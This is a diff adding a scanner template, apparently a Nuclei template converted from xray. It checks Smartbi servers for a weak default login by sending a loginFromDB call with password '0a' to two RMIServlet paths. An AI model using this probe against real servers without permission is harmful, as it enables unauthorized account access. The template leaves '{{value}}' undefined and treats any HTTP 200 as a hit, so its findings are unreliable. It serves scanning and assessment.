@@ -1,0 +1,39 @@
+id: poc-yaml-smartbi-default-user-weakpass
+
+info:
+  name: poc-yaml-smartbi-default-user-weakpass
+  author: chaitin
+  severity: medium
+  tags: xray-converted
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=113
+
+http:
+  - raw:
+      - |
+        POST /smartbi/vision/RMIServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /vision/RMIServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{value}}","0a"]
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
